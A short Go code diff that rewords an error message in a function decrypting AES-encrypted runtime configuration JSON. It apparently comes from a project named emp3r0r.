@@ -23,7 +23,7 @@ func ApplyRuntimeConfig() (err error) {
 	key := tun.GenAESKey(string(emp3r0r_data.OneTimeMagicBytes))
 	jsonData := tun.AESDecryptRaw(key, readJsonData)
 	if jsonData == nil {
-		err = fmt.Errorf("Decrypt JSON with key %s failed", key)
+		err = fmt.Errorf("Decrypt config JSON with key '%s' failed, invalid config data?", key)
 		return
 	}
 
